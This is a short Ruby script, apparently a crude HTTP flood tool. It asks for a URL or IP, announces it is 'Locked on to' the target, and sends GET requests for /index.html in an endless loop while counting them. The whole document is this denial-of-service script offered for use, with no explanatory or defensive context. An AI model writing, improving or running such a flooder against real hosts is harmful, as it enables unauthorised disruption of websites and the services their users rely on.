system "cls" or system "clear"
require 'net/http'
require 'colorize'
print "URL/IP: "
host = gets.chomp
puts "Empty input!".light_red if host.empty?
exit if host.empty?
system "cls" or system "clear"
puts "Locked on to: #{host}".light_red
puts "Use CTRL + C to exit".green
counter = 0
while true
Net::HTTP.get(host, '/index.html')
counter += 1
$stdout.write "\r[*] #{counter} Requests sent".green;
$stdout.flush;
end
